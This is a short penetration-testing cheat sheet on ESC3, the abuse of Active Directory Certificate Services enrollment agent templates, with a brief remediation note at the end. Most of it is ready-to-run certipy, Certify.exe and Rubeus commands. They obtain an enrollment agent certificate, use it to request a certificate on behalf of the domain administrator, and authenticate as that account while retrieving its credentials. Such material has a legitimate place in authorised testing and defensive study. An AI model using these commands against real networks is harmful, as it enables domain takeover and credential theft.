# ESC3 - Enrollment Agent Abuse


## Why It's Vulnerable

Two-step attack using two vulnerable templates:

1. A template with the **Certificate Request Agent** EKU - lets you become an "enrollment agent" (someone who can request certs on behalf of others)
2. A second template that allows **enrollment agents** to enroll on behalf of other users

## The Attack

**Step 1 - Get an enrollment agent certificate**
```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template EnrollmentAgentTemplate

# Output: user.pfx (enrollment agent cert)
```

**Step 2 - Use the agent cert to request a cert ON BEHALF OF Domain Admin**
```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template UserTemplate \
  -on-behalf-of corp\\administrator \
  -pfx user.pfx

# Output: administrator.pfx
```

**Step 3 - Authenticate**
```sh
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```

### Certify.exe (Windows alternative)

```powershell
# Step 1: enrollment agent cert
Certify.exe request /ca:CA-HOST\CORP-CA /template:EnrollmentAgentTemplate

# Step 2: request on-behalf-of DA using the agent cert
Certify.exe request /ca:CA-HOST\CORP-CA /template:UserTemplate \
  /onbehalfof:CORP\administrator \
  /enrollcert:C:\agent.pfx /enrollcertpw:<pfx-pass>

# Step 3: PKINIT as DA
Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> /nowrap /getcredentials
```

---

## Remediation

Restrict who can enroll in the Certificate Request Agent template to a specific, monitored service account. Enable **CA Manager Approval** to require manual sign-off on certificate requests.
